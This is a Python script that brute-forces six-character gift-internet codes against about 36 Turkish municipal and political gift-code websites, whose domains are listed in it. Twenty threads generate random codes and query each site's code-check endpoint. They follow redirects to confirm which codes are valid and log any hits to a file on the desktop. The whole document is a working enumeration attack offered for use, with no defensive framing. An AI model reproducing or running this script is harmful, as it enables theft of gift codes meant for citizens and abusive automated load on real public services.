import requests
import time
import random
import threading
from colorama import Fore
from pathlib import Path

domains = ["https://hediye.uskudar.bel.tr","https://hediye.adilcozum.com","https://qr.hediyegb.com.tr","https://hediyeinternet.sancaktepe.bel.tr","https://netbaskan.menemen.bel.tr","https://hediye.eyyupkadirinan.com.tr","https://hediyeinternet.amasya.bel.tr","https://hediyeinternet.ipekyolu.bel.tr","https://hediyegb.giresun.bel.tr","https://netbaskan.samsun.bel.tr","https://hediyegb.akpartibayrampasa.com","https://genc.sile.bel.tr","https://genchane.kagithane.bel.tr","https://mehmetmus.hediyegb.com.tr","https://hediye.mustafavarank.com.tr","https://mahmutgurcan.hediyegb.com.tr","https://genclikspor.kestel.bel.tr","https://hediyegb.numankurtulmus.com","https://hediye.erkankandemir.com.tr","https://mustafasen.hediyegb.com.tr","https://ahmetbuyukgumus.com","https://hediyegb.siirt.bel.tr","https://netbaskan.kahramankazan.bel.tr","https://hediyeinternet.palandoken.bel.tr","https://batmankart.com","https://hediyegb.erenler.bel.tr","https://netbaskan.corum.bel.tr","https://hediyegb.yalova.bel.tr","https://avnurettinalan.hediyegb.com.tr","https://hediyegb.emirdag.bel.tr","https://fethanbaykoc.hediyegb.com.tr","https://genc.yesilyurt.bel.tr","https://hediyegb.akyazi.bel.tr","https://gb.beyoglu.bel.tr","https://karabuk.hediyegb.com.tr"]
domain = "https://mehmetmus.hediyegb.com.tr"
desktop = str(Path.home()) + '\\Desktop\\'
code_check_url = domain + "/Transaction/CodeItemControlByCode?Code="
val_check_path = "/Home/IndexQr/?formId=0&code="

if not Path(desktop + "valid-yessir.txt").is_file():
    f = open(desktop + "valid-yessir.txt", "w+")
    f.close()


def check_code(code):
    try:
        r = requests.get(code_check_url + code)
        if r.text.find("true") != -1:
            guid = r.json()["data"]["guid"]
            return True, guid
        else:
            return False
    except:
        time.sleep(0.5)
        print("EXCEPTION")

def task():
    while True:
        random_code = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6))
        if check_code(random_code):
            c = requests.get(domain + val_check_path + check_code(random_code)[1], allow_redirects=False)
            if c.status_code == 302:
                c2 = requests.get(domain + str(c.headers["Location"]), allow_redirects=False)
                if c2.headers["location"] != "/error":
                    print(Fore.GREEN + "Code " + random_code + " is valid!  Domain: " + Fore.WHITE + domain + " " + Fore.CYAN + time.strftime("%H:%M:%S"))
                    f = open(desktop + "valid-yessir.txt", "a")
                    f.write(random_code + " " + domain + " " + time.strftime("%H:%M:%S") + "\n")
                    f.close()
                else:
                    print(Fore.YELLOW + "Code " + random_code + " is not valid! Attempt: " +  "1 / 36 " + "Domain: " + Fore.WHITE + domain + " " + Fore.CYAN + time.strftime("%H:%M:%S"))
                    for domainn in domains:
                        c3 = requests.get(domainn + val_check_path + check_code(random_code)[1], allow_redirects=False)
                        if c3.status_code == 302:
                            c4 = requests.get(domainn + str(c.headers["Location"]), allow_redirects=False)
                            if c4.headers["location"] != "/error":
                                print(Fore.GREEN + "Code " + random_code + " is valid!  Domain: " + Fore.WHITE + domainn + " " + Fore.CYAN + time.strftime("%H:%M:%S"))
                                f = open(desktop + "valid-yessir.txt", "a")
                                f.write(random_code + " " + domainn + " " + time.strftime("%H:%M:%S") + "\n")
                                f.close()
                                break
                            else:
                                print(Fore.YELLOW + "Code " + random_code + " is not valid! Attempt: " + str(domains.index(domainn) + 2) + " / 36 " + "Domain: " + Fore.WHITE + domainn + " " + Fore.CYAN + time.strftime("%H:%M:%S"))
                                if domainn == "https://karabuk.hediyegb.com.tr":
                                    print(Fore.RED + "Code " + random_code + " got rejected from all of the domains. " + Fore.CYAN + time.strftime("%H:%M:%S"))
        time.sleep(0.025)

for i in range(20):
    t = threading.Thread(target=task)
    t.start()
